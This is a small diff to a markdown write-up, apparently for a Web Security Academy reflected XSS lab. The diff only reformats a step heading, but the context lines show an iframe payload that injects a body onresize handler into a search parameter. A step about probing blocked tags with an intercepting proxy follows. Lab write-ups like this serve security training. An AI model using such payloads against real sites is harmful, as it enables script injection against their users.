@@ -10,7 +10,9 @@
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
 
-### step1
+---
+
+### step 1
 
 search any tag<> like `<script>` you will notice it is blocked not allowed
 intercept this request and send to intruder
